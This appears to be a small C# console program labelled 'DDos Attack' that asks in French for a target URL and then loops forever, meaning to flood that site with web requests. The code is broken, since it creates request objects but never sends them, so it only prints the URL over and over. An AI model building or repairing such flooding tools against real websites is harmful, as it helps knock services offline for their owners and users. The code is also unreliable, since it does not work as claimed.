using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Web;

namespace DOssAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            for (; ; )
            {
                Console.Title="DDos Attack";
                Console.Write("Entrer l'URL : ");
                string x = Console.ReadLine();
                while (true)
                {
                    try
                    {
                        HttpWebRequest requset = (HttpWebRequest)HttpWebRequest.Create(x);
                        Console.WriteLine(x);
                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }
        }
    }
}






                

